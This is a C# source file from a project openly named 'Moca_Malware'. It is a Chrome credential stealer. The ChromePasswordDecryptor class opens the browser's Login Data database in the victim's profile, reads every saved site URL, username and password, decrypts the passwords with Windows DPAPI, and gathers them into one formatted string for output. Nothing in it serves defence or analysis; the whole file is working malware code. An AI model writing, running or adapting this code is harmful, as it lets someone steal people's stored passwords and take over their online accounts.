using System;
using System.Data.SQLite;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Moca_Malware
{
    class ChromePasswordDecryptor
    {
        private string databasePath;

        private string connectionString;

        private SQLiteConnection dbConnection;

        public ChromePasswordDecryptor()
        {
            try
            {
                this.databasePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
                this.connectionString = "Data Source=" + this.databasePath + ";Version=3;";
                this.dbConnection = new SQLiteConnection(this.connectionString);
                this.dbConnection.OpenAsync();
            }
            catch (Exception ex)
            {
                ErrorHandler.errorRaised(ex);
            }
        }

        public string readDataFromDatabase()
        {
            string result = string.Empty;
            try
            {
                string sql = "SELECT action_url, username_value, password_value FROM logins";
                string output = "";
                SQLiteCommand command = new SQLiteCommand(sql, this.dbConnection);
                SQLiteDataReader reader = command.ExecuteReader();
                while (reader.Read())
                {
                    byte[] encryptedData = (byte[])reader[2];
                    byte[] decodedData = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
                    string plainText = Encoding.ASCII.GetString(decodedData);
                    object obj = output;
                    output = string.Concat(new object[]
                    {
                        obj,
                        "URL: ",
                        reader[0],
                        " USERNAME: ",
                        reader[1],
                        " PASSWORD: ",
                        plainText,
                        "\n<br>"
                    });
                }
                result = output;
            }
            catch (Exception ex)
            {
                ErrorHandler.errorRaised(ex);
            }
            return result;
        }
    }
}
